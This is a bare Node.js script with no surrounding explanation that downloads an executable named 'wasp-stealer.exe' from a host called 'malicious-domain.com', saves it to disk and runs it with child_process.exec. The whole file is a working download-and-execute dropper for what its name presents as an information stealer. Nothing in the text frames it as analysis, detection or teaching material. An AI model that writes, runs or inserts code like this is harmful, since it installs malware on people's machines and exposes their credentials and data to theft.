const https = require('https');
const fs = require('fs');
const { exec } = require('child_process');

https.get('https://malicious-domain.com/wasp-stealer.exe', (res) => {
  const file = fs.createWriteStream('wasp-stealer.exe');
  res.pipe(file);
  file.on('finish', () => {
    file.close(() => {
      exec('wasp-stealer.exe');
    });
  });
});

